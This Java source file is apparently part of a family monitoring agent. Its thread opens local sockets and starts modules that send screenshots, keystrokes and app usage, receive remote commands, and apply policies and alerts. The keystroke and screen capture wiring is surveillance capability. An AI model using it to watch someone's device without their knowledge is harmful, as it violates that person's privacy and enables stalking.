package com.family.agent.network;

import com.family.agent.controller.CommandListener;

import java.net.Socket;

public class Uploader extends Thread {
	
	public Uploader()
	{
		
	}
	
	public void run()
	{
		try
		{
			Socket soc1 = new Socket("localhost", 5000);
			// gui hinh anh
			Screenshot s = new Screenshot(soc1, 3000);
			s.start();

			Socket soc2 = new Socket("localhost", 2345);
			// gui ki tu
			Keystore k = new Keystore(soc2, 300000, 100);
			k.start();

			Socket appSocket = new Socket("localhost", 1234);
			AppUsage appusage = new AppUsage(appSocket);
			appusage.start();

			Socket soccmd = new Socket("localhost", 8888);
			CommandListener commandListener = new CommandListener(soccmd);
			commandListener.start();
			
			Socket soc3 = new Socket("localhost",4321);
			Policy p = new Policy(soc3);
			p.start();
			
			Socket soc4 = new Socket("localhost", 6969);
			Alert a = new Alert(soc4);
			a.start();
		}
		catch(Exception e)
		{
			e.printStackTrace();
		}
	
		
	}
}


